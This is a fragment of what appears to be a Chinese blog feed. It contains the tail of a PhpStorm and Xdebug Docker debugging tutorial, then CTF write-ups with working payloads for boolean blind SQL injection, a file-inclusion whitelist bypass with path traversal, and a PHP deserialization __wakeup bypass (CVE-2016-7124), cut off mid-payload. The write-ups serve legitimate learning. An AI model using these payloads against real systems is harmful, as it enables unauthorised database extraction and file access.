-p 81:80 -p 2222:22 test/testmyphp</span><br></pre></td></tr></table></figure><p>至此，调试环境所需要的服务就安装好了，接下来配置 PHPSTORM。</p><br><h2 id="配置-PHPSTORM-1"><a href="#配置-PHPSTORM-1" class="headerlink" title="配置 PHPSTORM"></a>配置 PHPSTORM</h2><p>打开 PHPSTORM，新建一个 Project。选择 <em>New Project from Existing Files</em></p><img src="/2021/03/17/2021-03-17-phpstorm-docker/1.png" width="500px"><p>选择 <em>Web server is on remote host</em>。</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/2.png" width="500px"><p>一路 <em>Next</em>。走到配置 <em>Remote Server</em></p><img src="/2021/03/17/2021-03-17-phpstorm-docker/3.png" width="500px"><p>然后又是一路 <em>Next</em> 即可。</p><p>配置完成后，将能看到我们的项目。</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/4.png" width="500px"><p>此时是不能直接进行代码调试的。我们要做以下工作</p><ol><li>配置 CLI Interpreter</li><li>配置目录映射</li><li>设置Xdebug端口</li><li>配置一个 Run/Debug Configuration</li><li>启动 PHP Debug Listening</li></ol><p><em>ps：由于有些步骤是一样的，就直接拉上文的截图过来了。</em></p><p><strong>配置 CLI Interpreter</strong></p><p>进入 <em>File -&gt; Settings -&gt; Languages &amp; Frameworks -&gt; PHP</em>。设置 CLI Interpreter</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/5.png" width="500px"><p>新建一个 <em>CLI Interpreter</em>。选择 <em>From Docker, Vagrant, VM, WSL,Remote….</em></p><p>这里我们可以填 SSH，也可以直接选择 Docker。我这里用的是 SSH</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/6.png" width="500px"><p>设置 PHP executable 路径。不知道可以进入 container 中使用 <code>whereis php</code> 进行搜索</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/7.png" width="500px"><p><strong>配置 目录映射</strong></p><p>进入 <em>File -&gt; Settings -&gt; Languages &amp; Frameworks -&gt; PHP -&gt; Servers</em>。配置目录映射</p><p>注意一定要把 <em>Use path mappings</em> 的勾勾上，才能配置目录映射</p><p><em>Absolute path on the server</em>  是要手动打上服务器路径的</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/8.png" width="500px"><p><strong>设置Xdebug端口</strong></p><p>进入 <em>File -&gt; Settings -&gt; Languages &amp; Frameworks -&gt; PHP</em> -&gt; Debug。设置 <em>Xdebug Debug port</em> 为 9003。和 php 配置一致。</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/9.png" width="500px"><p><strong>配置一个 Run/Debug Configuration</strong></p><p>点击 PHPSTORM 右上角的 *Add Configuration….*。进入配置面，新增一个 PHP Web Page。并进行如下简单的配置即可（改名字设url 路径）</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/10.png" width="500px"><p><strong>启动 PHP Debug Listening</strong></p><p>直接点击 PHPSTROM 右上角的 <em>小电话</em> ，即可开启监听</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/11.png" width="500px"><p><strong>验证</strong></p><p>在 php文件上打上断点，点击 右上角 甲壳虫样式的 Debug按钮。即可成功断点</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/12.png" width="500px"><p><strong>扩展 - 远程服务器调试</strong></p><p>这里可以扩展以一下，如果调试目标是远程服务器而不是本地 Docker，该如何配置？</p><p>其实和上面的步骤一样的，只是 Xdebug 监听的流量我们要做修改下。</p><p><strong>简单说说 Xdebug 监听的原理：</strong></p><p>当 php-xdebug 接收到带有 XDEBUG_SESSION_START 的请求时，将会把当前的 Debug信 息发送给 xdebug 中配置的 client_host 和 cilent_port。</p><p>在我们的 start.sh 启动文件中，设置如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xdebug.client_host = host.docker.internal</span><br><span class="line">xdebug.client_port = 9003</span><br></pre></td></tr></table></figure><p><code>host.docker.internal</code> 值在 Xdebug 中是自动将请求端的 ip 设置为 调试端，即自动将 Debug信息 发送给任何请求IP。</p><p>而 <code>xdebug.client_port</code> 的值是 Debug信息 被发送至的端口。</p><br><p>我们可以想下，在本地，xdebug端是能访问到到我们请求端的 ip 和 端口 的，因为都是同一局域网。</p><p>但若调试的是远程服务器，由于公网和内网的原因，公网服务器是无法发送 Debug信息 调试端的（除非调试端也在公网上。。）</p><br><p>所以我们需要将 <code>xdebug.client_host</code> 设置为 <code>127.0.0.1</code>，让 xdebug 转发 Debug信息 到本地的 9003 端口中。</p><p>接着使用 ssh 隧道进行端口转发，把调试端监听的 9003 端口映射到 服务端的 9003 上。这样就能接收到 xdebug 转发的 Debug信息了。这一点使用 ssh 隧道是可以做到的。</p><br><p>我们来测试下，首先修改 php.ini。让 <code>xdebug.client_host</code> 值为 <code>127.0.0.1</code></p><img src="/2021/03/17/2021-03-17-phpstorm-docker/13.png" width="500px"><p>进行 ssh隧道端口转发</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -N -R 远程IP:远程端口:127.0.0.1:9003 root@远程IP</span><br></pre></td></tr></table></figure><p>这样就能使用调试远程程序了。</p><br><h1 id="Reference："><a href="#Reference：" class="headerlink" title="Reference："></a>Reference：</h1><p><a href="https://docs.docker.com/engine/reference/builder/">https://docs.docker.com/engine/reference/builder/</a></p><p><a href="https://hub.docker.com/_/php">https://hub.docker.com/_/php</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文首发在 Freebuf。但好像排版没那么好看 233.。。。于是想博客也发一份对照看看，个人感觉还是我这里的排版好看点哈哈哈&lt;/p&gt;</summary>
    
    
    
    <category term="Docker" scheme="http://example.com/categories/Docker/"/>
    
    
    <category term="Docker" scheme="http://example.com/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>CTF玩耍系列[2] - [VNCTF2021] WEB realezjvav &amp;&amp; Ez_game</title>
    <link href="http://example.com/2021/03/15/2021-03-14-VNCTF2021-log/"/>
    <id>http://example.com/2021/03/15/2021-03-14-VNCTF2021-log/</id>
    <published>2021-03-15T02:01:08.000Z</published>
    <updated>2021-03-24T14:50:55.983Z</updated>
    
    <content type="html"><![CDATA[<p>简单记录下第二次参加CTF。。虽然还是做不出来题。。。</p><p>这篇文章主要就是想分享下 Mysql if 的一个小技巧。增加一个布尔注入的小姿势。</p><span id="more"></span><br><h1 id="Web-realezjvav"><a href="#Web-realezjvav" class="headerlink" title="Web - realezjvav"></a>Web - realezjvav</h1><p>本来看到 java 没打算看的，可是出题人说这个并没有考到多少 java 知识。便去瞄了下。此题需要两步才能得解。我只做出了第一步。。。第一步是 SQL布尔注入，第二步虽然没做出来，但是估计是 fastjson 的 RCE</p><img src="/2021/03/15/2021-03-14-VNCTF2021-log/1.png" style="width:500px;"><p>通过测试得知，<code>password</code> 存在 SQL 注入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[PAYLOAD:]</span><br><span class="line">username=admin&amp;password=123456&#x27;</span><br><span class="line">[OUTPUT:]</span><br><span class="line">HTTP/1.1 500</span><br><span class="line"></span><br><span class="line">[PAYLOAD:]</span><br><span class="line">username=admin&amp;password=123456</span><br><span class="line">[OUTPUT:]</span><br><span class="line">HTTP/1.1 200</span><br></pre></td></tr></table></figure><br><p>在经过一番尝试，发现当字段中存在 <code>union</code> 或者 <code>sleep</code> 时，会将整个 <code>password</code> 的值清空再带入到 SQL语句中。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[PAYLOAD:]</span><br><span class="line">username=admin&amp;password=&#x27; union select#</span><br><span class="line">[OUTPUT:]</span><br><span class="line">HTTP/1.1 200</span><br><span class="line">[根据前后响应，判断此时的 SQL 语句在执行是应该是:]</span><br><span class="line">select * from table where username=&#x27;admin&#x27; and password = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">[PAYLOAD:]</span><br><span class="line">username=admin&amp;password=&#x27; select#</span><br><span class="line">[OUTPUT:]</span><br><span class="line">HTTP/1.1 500</span><br><span class="line">[根据前后响应，判断此时的 SQL 语句在执行是应该是:]</span><br><span class="line">select * from table where username=&#x27;admin&#x27; and password = &#x27;&#x27; select#&#x27;</span><br><span class="line"></span><br><span class="line">==================</span><br><span class="line"></span><br><span class="line">[PAYLOAD:]</span><br><span class="line">username=admin&amp;password=&#x27; and sleep(3)#</span><br><span class="line">[OUTPUT:]</span><br><span class="line">HTTP/1.1 200</span><br><span class="line">[根据前后响应，判断此时的 SQL 语句在执行是应该是:]</span><br><span class="line">select * from table where username=&#x27;admin&#x27; and password = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">[PAYLOAD:]</span><br><span class="line">username=admin&amp;password=&#x27; and select(1)#</span><br><span class="line">[OUTPUT:]</span><br><span class="line">HTTP/1.1 500</span><br><span class="line">[根据前后响应，判断此时的 SQL 语句在执行是应该是:]</span><br><span class="line">select * from table where username=&#x27;admin&#x27; and password = &#x27;&#x27; and select(1)#&#x27;</span><br></pre></td></tr></table></figure><br><p>并且值得注意的是，不管万能密码是否奏效， and 和 or 怎么混着用，页面返回都是一样的，我们只能根据状态码来判断 SQL语句是否生效。</p><p>这里有两种思路:</p><ol><li><p>无回显的 SQL 注入，那么我们可以使用 DNSLOG 来创造回显。可惜这里的 load_file() 没法正常使用。 load_file() 无法制造 DNSLOG 的原因一般为两个l：<code>Linux环境</code>或 <code>secure_filr_priv=NULL</code></p></li><li><p>既然需要根据状态码来判断SQL语句执行状态，我们就得设法让 SQL 语句报错。这里就涉及到一个 <em>Mysql</em> <code>if</code> 的小技巧</p></li></ol><p>在 Mysql 中，<code>if</code> 的基本用法如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(表达式, 表达式为<span class="literal">True</span>执行的语句, 表达式为<span class="literal">False</span>执行的语句);</span><br></pre></td></tr></table></figure><p>简单使用:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> if((<span class="keyword">select</span> <span class="number">1</span>) ,<span class="number">1</span> , <span class="number">0</span>);</span><br><span class="line">[OUTPUT:]</span><br><span class="line"><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> if((<span class="keyword">select</span> <span class="number">0</span>) ,<span class="number">1</span> , <span class="number">0</span>);</span><br><span class="line">[OUTPUT:]</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure><p>值得注意的是，当表达式返回 True 时，是不会执行 <code>if</code> 的第三个参数的。同理，当表达式返回 False 时，也不会执行 <code>if</code> 的第二个参数。</p><p>并且 if 的参数只接受一行值，如果执行的子查询返回了多行值，将会报错。</p><p>综上所述，我们可以构造这样的 POC</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> if( (<span class="keyword">select</span> <span class="number">1</span>), <span class="number">1</span>, (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> mysql.user) );</span><br><span class="line">[OUTPUT:]</span><br><span class="line"><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> if( (<span class="keyword">select</span> <span class="number">0</span>), <span class="number">1</span>, (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> mysql.user) );</span><br><span class="line">[OUTPUT:]</span><br><span class="line">ERROR <span class="number">1242</span> (<span class="number">21000</span>): Subquery <span class="keyword">returns</span> more than <span class="number">1</span> <span class="type">row</span></span><br></pre></td></tr></table></figure><br><p>明白这种性质之后，我们就可以使用这个性质来进行基于 <strong>HTTP code</strong> 的<strong>布尔盲注</strong>了</p><p><strong>Poc:</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[PAYLOAD:]</span><br><span class="line">&#x27; or if( (select 1), 1, (select 1 from mysql.user) )#</span><br><span class="line">[OUTPUT:]</span><br><span class="line">HTTP/1.1 200</span><br><span class="line"></span><br><span class="line">[PAYLOAD:]</span><br><span class="line">&#x27; or if( (select 0), 1, (select 1 from mysql.user) )#</span><br><span class="line">[OUTPUT:]</span><br><span class="line">HTTP/1.1 500</span><br></pre></td></tr></table></figure><br><p>结合 substr() 和 limit 注表名:</p><p><span style="color:red">注意:如果想扔到 burp 里跑十六进制的表名。注意十六进制是 0-9,a-f 而不是单单的 0-9。我这里就被坑了一下。。。</span></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[PAYLOAD:]</span><br><span class="line"><span class="string">&#x27; or </span></span><br><span class="line"><span class="string">if( </span></span><br><span class="line"><span class="string">(select </span></span><br><span class="line"><span class="string">substr(</span></span><br><span class="line"><span class="string">(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1)</span></span><br><span class="line"><span class="string">,1,1 )</span></span><br><span class="line"><span class="string">) = 0x55</span></span><br><span class="line"><span class="string">, 1, (select 1 from mysql.user) </span></span><br><span class="line"><span class="string">)#</span></span><br></pre></td></tr></table></figure><p>最后爆出密码登陆后台，发现里面的功能传输格式是 json 格式，猜测可能是 fastjson的漏洞。可惜没怎么了解，遂没有继续下去。</p><br><h1 id="Web-Ez-game"><a href="#Web-Ez-game" class="headerlink" title="Web - Ez_game"></a>Web - Ez_game</h1><p>一开就是个游戏，提示通关有 FLAG</p><img src="/2021/03/15/2021-03-14-VNCTF2021-log/2.png" style="width:500px;"><p>瞄了一下网络请求，没有与后端交互的请求。估计都是 js 写的。</p><p>查看首页HTML源码，发现注释写着一共有十关</p><p>找到一个 js 文件 game.js 。里面似乎都是些人物的属性。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PlayerData</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// track player data between levels (when player is destroyed)</span></span><br><span class="line">    <span class="title">constructor</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.health = <span class="number">3</span>;</span><br><span class="line">        <span class="built_in">this</span>.healthMax = <span class="number">3</span>;</span><br><span class="line">        <span class="built_in">this</span>.boomerangs = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">this</span>.bigBoomerangs = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">this</span>.coins = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>尝试直接在 console 控制台处修改人物属性。发现了一个 <em>player</em> 对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Player </span><br><span class="line">......</span><br><span class="line">health: <span class="number">3</span></span><br><span class="line">healthMax: <span class="number">3</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>尝试修改这些属性</p><img src="/2021/03/15/2021-03-14-VNCTF2021-log/3.png" style="width:500px;"><p>发现我们变强力了。</p><p>玩一玩这个游戏，玩到第三关的时候，发现死亡后重生时可以进入之前存档的一关。</p><p>在 js 中找到疑似 存档关卡的一个值 <code>localStorage.kbap_warp</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">NextLevel</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">......</span><br><span class="line">    <span class="comment">// track highest level reached</span></span><br><span class="line">    <span class="keyword">if</span> (!speedRunMode &amp;&amp; levelNumber&gt;warpLevel)</span><br><span class="line">        warpLevel = levelNumber;</span><br><span class="line">    <span class="built_in">localStorage</span>.kbap_warp = warpLevel;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们先径直来到第三关，然后设置 <code>localStorage.kbap_warp</code> 为 10，这样我们死亡后去进入存档，就可以直接打 boss 战了。</p><p>来到 boss 战把自己的属性修改强力，很轻松就斩杀 Boss</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;简单记录下第二次参加CTF。。虽然还是做不出来题。。。&lt;/p&gt;
&lt;p&gt;这篇文章主要就是想分享下 Mysql if 的一个小技巧。增加一个布尔注入的小姿势。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="WEB" scheme="http://example.com/categories/CTF/WEB/"/>
    
    
    <category term="Mysql" scheme="http://example.com/tags/Mysql/"/>
    
    <category term="Javascript" scheme="http://example.com/tags/Javascript/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF玩耍系列[1] - [HCTF 2018]WarmUp | [极客大挑战 2019]PHP | [MRCTF2020]你传你🐎呢</title>
    <link href="http://example.com/2021/03/13/2021-03-13-buuctf-1/"/>
    <id>http://example.com/2021/03/13/2021-03-13-buuctf-1/</id>
    <published>2021-03-13T03:50:45.000Z</published>
    <updated>2021-03-15T01:51:23.735Z</updated>
    
    <content type="html"><![CDATA[<p>周末玩了玩CTF，做个小记录</p><p>平台地址：</p><p><a href="https://buuoj.cn/">https://buuoj.cn/</a></p><span id="more"></span><br><h1 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h1><p>访问靶机，只发现一滑稽.</p><p>查看网页源码，发现注释写着 <code>source.php</code>。遂访问之。得到一个 <code>highlight_file</code> 的 php 源码</p><p>代码可以阉割成如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//白名单</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// $page 必须是字符串，不能传入数组</span></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//字符串切割，只保留 ? 前面的部分</span></span><br><span class="line">    <span class="comment">//注意，这里切割之后的值是保存在 $_page 中，并不是修改了 $page。所以原来的 $_REQUEST[&#x27;file&#x27;] 并没有改变</span></span><br><span class="line">    <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">        <span class="variable">$page</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//判读 $_Ppage 是否在白名单中</span></span><br><span class="line">    <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">    <span class="comment">//文件包含</span></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由于白名单中提示了一个 <code>hint.php</code> 。访问之。提示:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure><br><p>综合以上的分析，我们得知虽然在 <code>checkFile()</code> 函数中，会对 <code>$_REQUEST[&#39;file&#39;]</code> 进行截取，保留 <code>?</code>符号 前面的部分存入  <code>$_page</code> 中。但是最后 inlucde 的还是原始的 <code>$_REQUEST[&#39;file&#39;]</code>。</p><br><p>绕过 PAYLOAD:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=source.php?/../hint.php</span><br></pre></td></tr></table></figure><p><code>source.php</code> 后面紧跟着 <code>?</code> 号。确保在 <code>checkFile()</code> 中能够返回 true。</p><p><code>source.php</code> 和 <code>?/</code> 一起组合成了 <code>source.php?/</code>。php 将会将其当作一个目录名，即使这个目录不存在。接着使用 <code>../</code> 跳出目录，包含 <code>hint.php</code> 以验证 payload。</p><br><p>实验证明，上述 payload 确实有效。</p><p>获取 flag 的姿势也是一样的，就改个文件名和路径而已。 需要注意的是flag 在 Linux 根目录下而不是和 Web 同级。</p><br><h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h1><p>访问靶机，发现提示 <em>备份网站</em>。遂开 burp 跑字典</p><p>推荐下 key师傅 的字典。这里跑的字典用的是 <em>Dir/Ctf.txt</em></p><p><a href="https://github.com/gh0stkey/Web-Fuzzing-Box">https://github.com/gh0stkey/Web-Fuzzing-Box</a></p><img src="/2021/03/13/2021-03-13-buuctf-1/2.png" style="width:800px;"><p>获得备份文件 <a href="http://www.zip.下载解压/">www.zip。下载解压</a></p><img src="/2021/03/13/2021-03-13-buuctf-1/3.png" style="width:200px;"><br><p>index.php 源码可以阉割成这样:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"><span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line"><span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><p>class.php 源码可以阉割成这样如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="comment">//魔术方法。在反序列化时自动调用</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//析构方法，在类执行完毕资源回收时自动调用</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><p>看到一个 <code>__wakeup()</code> 。这个函数会将 <code>$this-&gt;username</code> 赋值为 <em>guest</em>。可是其值需要为 <em>admin</em> 才能获取 flag。</p><p>我们可以试试 <em>CVE-2016-7124</em>。这个 CVE 是专门针绕过 <code>__wakeup()</code>方法的。影响范围为 <em>PHP before 5.6.25 and 7.x before 7.0.10</em>。</p><p>利用方式为，当序列化字符串中 ，若对象属性数大于实际属性数时， <code>__wakeup()</code> 将不会被自动调用</p><p>若不会PHP反序列化，安利下之前写过的一篇文章 :)</p><p><a href="https://www.freebuf.com/articles/web/209975.html">https://www.freebuf.com/articles/web/209975.html</a></p><br><p><strong>poc:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Name();</span><br><span class="line">var_dump(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php5.6 ttt.php</span><br><span class="line">/var/www/html/ctf/ttt.php:12:</span><br><span class="line">string(106) &quot;O:4:&quot;Name&quot;:3:&#123;s:14:&quot;\000Name\000username&quot;;s:5:&quot;admin&quot;;s:14:&quot;\000Name\000password&quot;;i:100;s:15:&quot;\000Name\000password2&quot;;i:100;&#125;&quot;</span><br></pre></td></tr></table></figure><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原 payload。实际对象属性数为<span class="number">2</span></span><br><span class="line">O:<span class="number">4</span>:<span 